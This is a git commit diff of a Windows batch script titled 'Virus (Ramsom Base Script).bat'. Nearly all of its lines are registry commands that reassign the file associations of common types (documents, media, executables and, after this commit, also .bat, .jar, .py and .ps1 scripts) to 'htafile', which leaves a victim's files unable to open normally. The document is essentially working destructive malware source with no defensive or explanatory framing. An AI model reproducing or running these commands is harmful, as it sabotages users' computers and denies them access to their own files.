4407c34c358eb58ebddbcda6fe7c63f1665f2ee3
S4LSalsoft-PC\S4LSalsoft <grupo.fisica.638@gmai.com>
2018-10-05 10:08:48 -0400

    no message

--- Virus (Ramsom Base Script).bat
+++ Virus (Ramsom Base Script).bat
@@ -1,4 +1,5 @@
 @echo off
+Rem BY **Aincrad**
 reg add HKCU\Software\Classes\.VBS /d "htafile" /f
 reg add HKCU\Software\Classes\.docx /d "htafile" /f
 reg add HKCU\Software\Classes\.pdf /d "htafile" /f
@@ -6,4 +7,8 @@ reg add HKCU\Software\Classes\.doc /d "htafile" /f
 reg add HKCU\Software\Classes\.mp3 /d "htafile" /f
 reg add HKCU\Software\Classes\.mp4 /d "htafile" /f
 reg add HKCU\Software\Classes\.EXE /d "htafile" /f
+reg add HKCU\Software\Classes\.bat /d "htafile" /f
+reg add HKCU\Software\Classes\.jar /d "htafile" /f
+reg add HKCU\Software\Classes\.py /d "htafile" /f
+reg add HKCU\Software\Classes\.ps1 /d "htafile" /f
 exit
